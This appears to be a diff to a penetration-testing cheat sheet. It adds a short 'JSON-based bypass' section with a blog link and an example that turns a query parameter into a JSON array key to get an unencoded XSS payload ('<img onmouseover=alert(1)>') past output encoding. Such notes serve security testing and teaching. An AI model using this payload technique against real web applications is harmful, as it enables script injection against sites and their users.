@@ -387,6 +387,18 @@ Bypass a WAF by challenging assumptions.
 * Content-Length header  
 Consider this: WAF's are extremely complex systems defending extremely complex systems.
 
+**JSON-based bypass**
+* http://c0d3g33k.blogspot.com/2017/11/story-of-json-xss.html
+* ^User-controlled input being reflected in a json-response, but value is output encoded -> convert JSON key to a JSON-array (giving you control of what goes into the key) -> escape JSON context via. manipulating the key
+```
+INPUT WITHOUT BYPASS: ?status=test<script>
+JSON RESPONSE BEFORE BYPASS: {"success": true, "status": "test&lt;script&gt;"}
+
+INPUT WITH ARRAY BYPASS: ?status[<img onmouseover=alert(1)>]=test
+JSON RESPONSE AFTER BYPSASS: {"success": true, "status":{"<img onmouseover=alert(1)>": "test"}}
+```
+
+
 ### ============================================================
 ### SQL Injection
 ### ============================================================
